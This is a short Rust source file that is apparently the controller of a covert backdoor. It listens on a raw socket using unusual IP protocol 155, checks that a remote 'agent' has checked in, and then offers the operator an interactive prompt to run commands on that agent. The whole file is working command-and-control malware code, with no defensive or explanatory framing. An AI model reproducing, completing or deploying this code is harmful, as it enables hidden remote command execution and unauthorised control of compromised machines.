mod server;

use crate::server::server::{Parse, Server};
use anyhow::anyhow;
use socket2::{Domain, Protocol, Socket, Type};
use std::mem::MaybeUninit;

fn main() -> anyhow::Result<()> {
    let sock = Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::from(155)))?;

    let mut data = Box::new([MaybeUninit::new(0u8); 65535]);
    let (n, agent) = sock.recv_from(&mut *data)?;

    let server = Server { agent, sock };

    let data = data.parse(n)?;

    if data == b"online" {
        server.online()?;
        println!("[+]b1n :)");
        println!("[+]input command to execute");
        println!("[+]input `q` to exit");
    } else {
        return Err(anyhow!("fake agent"));
    }

    server.handle()?;

    Ok(())
}
